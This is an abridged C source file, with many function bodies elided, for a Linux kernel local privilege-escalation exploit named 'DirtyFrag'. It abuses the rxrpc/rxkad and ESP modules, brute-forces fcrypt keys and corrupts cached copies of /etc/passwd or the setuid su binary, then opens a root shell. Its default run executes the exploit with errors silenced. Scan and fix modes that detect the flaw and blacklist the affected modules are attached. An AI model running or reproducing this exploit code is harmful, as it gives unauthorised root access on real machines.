 ...
 *
 * 3. Scan mode: --scan detects if system is vulnerable
 * 4. Fix mode: --fix applies mitigation
 *
...
/* Attacker-chosen 8-byte session key for rxkad */
static uint8_t SESSION_KEY[8] = {
	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
};

static int g_su_verbose = 0;
...
/* ====================================================================
 * RXRPC LPE - Part 2 (fcrypt + brute force)
 * ==================================================================== */
...
static int do_unshare_userns_netns(void)
{
	...
	LOG("uid/gid identity-mapped %u/%u", real_uid, real_gid);
		...
		uint16_t service_id, unsigned long user_call_id)
{
	...
	*(unsigned long *)CMSG_DATA(cmsg) = user_call_id;
	...
	LOG("client sendmsg %zd B → :%u", n, srv_port);
	return 0;
}
...
static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
{
	...
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
		if (trigger_seq < 5) WARN("udp_recv_to: n=%zd", n);
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
...
static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
		...
		uint64_t seed_init, const char *label)
{
	fcrypt_uctx ctx;
	uint8_t K[8], P[8];
	...
	for (uint64_t iter = 0; iter < max_iters; iter++) {
		...
		if (check(P)) {
			...
			LOG("%s found after %lu iters in %.2fs (%.2fM/s) K=%02x%02x%02x%02x%02x%02x%02x%02x",
					label, (unsigned long)iter, dt, iter / dt / 1e6,
...
int rxrpc_lpe_main(int argc, char **argv)
{
	...
	struct stat st;
	fstat(rfd_ro, &st);
	if (st.st_size < 32) { WARN("target too small"); return 1; }
	LOG("target %s opened RO, size=%lld", target_path, (long long)st.st_size);
	...
	fprintf(stderr, "[*] /etc/passwd line 1 BEFORE: '");
	for (int i = 0; i < 32; i++) {
	...
	if (pread(rfd_ro, Ca, 8, off_a) != 8) { WARN("pread Ca failed"); return 1; }
	if (pread(rfd_ro, Cb, 8, off_b) != 8) { WARN("pread Cb failed"); return 1; }
	if (pread(rfd_ro, Cc, 8, off_c) != 8) { WARN("pread Cc failed"); return 1; }
...
/* ====================================================================
 * SCAN MODE: Check if system is vulnerable
 * ==================================================================== */
static int check_module_loaded(const char *modname)
{
	char path[256];
	snprintf(path, sizeof(path), "/sys/module/%s", modname);
	struct stat st;
...
static int is_vulnerable(void)
{
	...
	printf("[*] Checking DirtyFrag vulnerability...\n");
	
	if (check_module_loaded("esp4") || check_module_loaded("esp6")) {
		printf("[!] ESP module found - AF_ALG/ESP attack surface present\n");
		vulnerable = 1;
	}
	
	if (check_module_loaded("rxrpc")) {
		printf("[!] rxrpc module found - rxkad attack surface present\n");
		vulnerable = 1;
	}
	...
	if (stat("/usr/bin/su", &st) == 0) {
		if (st.st_mode & S_ISUID) {
			printf("[+] /usr/bin/su is setuid (target present)\n");
		}
	}
	...
	if (fp) {
		...
		if (fgets(ver, sizeof(ver), fp)) {
			...
			if (sscanf(ver, "%d.%d", &major, &minor) == 2) {
				if (major == 5 && minor <= 15) {
					printf("[!] Kernel %d.%d may be vulnerable\n", major, minor);
					vulnerable = 1;
				} else if (major == 6 && minor <= 5) {
					printf("[!] Kernel %d.%d may be vulnerable\n", major, minor);
					vulnerable = 1;
				} else {
					printf("[*] Kernel %d.%d appears modern\n", major, minor);
				}
			}
		}
		pclose(fp);
...
/* ====================================================================
 * FIX MODE: Apply system mitigation
 * ==================================================================== */
static int apply_fix(void)
{
	printf("[*] Applying DirtyFrag mitigation...\n");
	
	const char *blacklist_content = 
		"# DirtyFrag mitigation - block vulnerable modules\n"
		"install esp4 /bin/false\n"
		"install esp6 /bin/false\n"
		"install rxrpc /bin/false\n"
		"install af_key /bin/false\n";
	
	FILE *fp = fopen("/etc/modprobe.d/dirtyfrag.conf", "w");
	if (!fp) {
		perror("Failed to create /etc/modprobe.d/dirtyfrag.conf");
		return -1;
	}
	fprintf(fp, "%s", blacklist_content);
	fclose(fp);
	printf("[+] Created /etc/modprobe.d/dirtyfrag.conf\n");
	
	system("rmmod esp4 esp6 rxrpc af_key 2>/dev/null");
	printf("[+] Attempted to unload vulnerable modules\n");
	
	FILE *f = fopen("/proc/sys/vm/drop_caches", "w");
	if (f) {
		fprintf(f, "3\n");
		fclose(f);
		printf("[+] Dropped page caches\n");
	}
	
	printf("\n[*] Verification:\n");
	if (!check_module_loaded("esp4") && !check_module_loaded("esp6")) {
		printf("[+] ESP modules are blocked/unloaded\n");
	} else {
		printf("[!] ESP modules still present - reboot may be required\n");
	}
	
	if (!check_module_loaded("rxrpc")) {
		printf("[+] rxrpc module is blocked/unloaded\n");
	} else {
		printf("[!] rxrpc module still present - reboot may be required\n");
	}
	
	printf("\n[!] Note: A system reboot is recommended to fully clear any\n"
	       "    residual kernel state and ensure modules remain unloaded.\n");
	
	return 0;
}

/* ====================================================================
 * MAIN with scan/fix modes
 * ==================================================================== */
static const uint8_t su_marker_check[8] = {
	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
};

static int su_already_patched_check(void)
{
	...
	return memcmp(got, su_marker_check, sizeof(su_marker_check)) == 0;
}

static int passwd_already_patched_check(void)
{
...
static int either_target_patched_check(void)
{
	return su_already_patched_check() || passwd_already_patched_check();
}

static void silence_stderr_fix(int *saved_fd)
{
...
static void restore_stderr_fix(int saved_fd)
{
	if (saved_fd >= 0) {
...
static char **append_corrupt_only_flag(int argc, char **argv, int *new_argc)
{
...
static void exec_su_login_fix(void)
{
...
static int run_root_pty_fix(void)
{
...
int main(int argc, char **argv)
{
	...
	if (scan_mode) {
		int vuln = is_vulnerable();
		if (vuln) {
			printf("\n[!!!] SYSTEM IS VULNERABLE to DirtyFrag\n");
			printf("[*] Run with --fix to apply mitigation\n");
			return 0;
		} else {
			printf("\n[+] System does not appear vulnerable\n");
			return 1;
		}
	}
	...
	if (fix_mode) {
		if (getuid() != 0) {
			fprintf(stderr, "[!] --fix requires root privileges\n");
			fprintf(stderr, "[*] Please run: sudo %s --fix\n", argv[0]);
			return 1;
		}
		return apply_fix();
	}
	...
	co_argv = append_corrupt_only_flag(argc, argv, &new_argc);

	if (!verbose)
		silence_stderr_fix(&saved_err);

	if (force_rxrpc) {
		rc = rxrpc_lpe_main(new_argc, co_argv);
		for (int i = 0; !passwd_already_patched_check() && i < 3; i++)
			rc = rxrpc_lpe_main(new_argc, co_argv);
	} else if (force_esp) {
		rc = su_lpe_main(new_argc, co_argv);
	} else {
		rc = su_lpe_main(new_argc, co_argv);
		if (!su_already_patched_check()) {
			rc = rxrpc_lpe_main(new_argc, co_argv);
			for (int i = 0; !passwd_already_patched_check() && i < 3; i++)
				rc = rxrpc_lpe_main(new_argc, co_argv);
		}
	...
	int patched = either_target_patched_check();

	if (!verbose)
		restore_stderr_fix(saved_err);

	if (patched) {
		(void)run_root_pty_fix();
		return 0;
	}
